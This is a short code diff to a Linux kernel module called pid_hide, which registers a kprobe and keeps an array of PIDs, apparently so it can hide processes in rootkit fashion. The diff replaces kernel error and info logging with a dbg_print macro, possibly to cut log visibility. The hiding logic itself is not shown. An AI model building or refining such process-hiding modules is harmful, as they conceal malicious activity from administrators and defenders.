@@ -42,7 +42,7 @@ static bool check_pid(pid_t pid)
 static void add_pid(pid_t pid)
 {
 	if (pid_count >= MAX_PIDS) {
-		pr_err("PID array is full\n");
+		dbg_print("PID array is full\n");
 		return;
 	}
 
@@ -100,13 +100,13 @@ static int __init pid_hide_init(void)
 
 	pid_to_hides = kmalloc_array(MAX_PIDS, sizeof(int), GFP_KERNEL);
 	if (!pid_to_hides) {
-		pr_err("Failed to allocate PID array memory\n");
+		dbg_print("Failed to allocate PID array memory\n");
 		return -ENOMEM;
 	}
 
 	ret = register_kprobe(&kp);
 	if (ret < 0) {
-		pr_err("register_kprobe failed, returned %d\n", ret);
+		dbg_print("register_kprobe failed, returned %d\n", ret);
 		kfree(pid_to_hides);
 		return ret;
 	}
@@ -118,7 +118,7 @@ static void __exit pid_hide_exit(void)
 {
 	unregister_kprobe(&kp);
 	kfree(pid_to_hides);
-	pr_info("pid_hide exit successfully\n");
+	dbg_print("pid_hide exit successfully\n");
 }
 
 module_init(pid_hide_init) module_exit(pid_hide_exit)
